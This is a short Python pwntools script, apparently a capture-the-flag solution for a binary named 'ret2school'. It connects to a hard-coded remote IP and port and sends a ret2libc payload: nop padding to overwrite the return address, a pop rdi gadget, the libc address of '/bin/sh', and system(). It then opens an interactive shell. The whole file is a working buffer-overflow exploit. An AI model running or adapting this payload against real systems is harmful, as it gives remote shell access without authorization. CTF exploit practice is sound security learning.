#!/bin/python3

from pwn import *

# Binary filename
#exe = './ret2school'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = remote("20.169.252.240", 4922)

# Lib-c offsets, FOUND MANUALLY (ASLR_OFF)
libc = ELF('./libc.so.6')
libc.address = 0x00007f8447e46000

# POP RDI gadget (found with ropper)
pop_rdi = 0x400743

# How many bytes to the instruction pointer (RIP)?
padding = 40

# Payload to get shell
payload = flat(

    asm('nop') * padding, 
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),  # Address of /bin/sh in libc
    libc.symbols.system,  # Address of system function in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
